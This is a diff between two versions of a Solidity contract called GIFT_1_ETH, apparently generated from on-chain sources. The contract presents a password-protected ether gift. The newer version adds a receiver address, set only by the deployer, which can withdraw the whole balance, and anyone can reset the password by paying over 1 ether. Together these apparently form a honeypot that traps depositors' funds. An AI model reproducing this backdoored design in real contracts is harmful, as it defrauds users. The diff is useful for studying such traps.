@@ -1,29 +1,51 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0xAded0438139B495DB87d3f70f0991336df97136f
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x0595d187cAc88F04466371Eff3A6b6d1B12Fb013
 */
 pragma solidity ^0.4.19;
 
 contract GIFT_1_ETH
 {
-    bytes32 public hashPass;
+    function GetGift(bytes pass)
+    external
+    payable
+    {
+        if(hashPass == keccak256(pass) && now>giftTime)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    function GetGift()
+    public
+    payable
+    {
+        if(msg.sender==reciver && now>giftTime)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    bytes32 hashPass;
     
     bool closed = false;
     
     address sender;
+    
+    address reciver;
  
-    uint unlockTime;
+    uint giftTime;
  
-    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
+    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
     
     function SetPass(bytes32 hash)
     public
     payable
     {
-        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00 )
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
         {
             hashPass = hash;
             sender = msg.sender;
-            unlockTime = now;
+            giftTime = now;
         }
     }
     
@@ -32,29 +54,16 @@ contract GIFT_1_ETH
     {
         if(msg.sender==sender)
         {
-            unlockTime = date;
+            giftTime = date;
         }
     }
     
-    function GetGift(bytes pass)
-    external
-    payable
-    canOpen
-    {
-        if(hashPass == keccak256(pass))
-        {
-            msg.sender.transfer(this.balance);
-        }
-    }
-    
-    function Revoce()
+    function SetReciver(address _reciver)
     public
-    payable
-    canOpen
     {
         if(msg.sender==sender)
         {
-            sender.transfer(this.balance);
+            reciver = _reciver;
         }
     }
     
@@ -65,12 +74,6 @@ contract GIFT_1_ETH
         {
            closed=true;
         }
-    }
-    
-    modifier canOpen
-    {
-        require(now>unlockTime);
-        _;
     }
     
     function() public payable{}
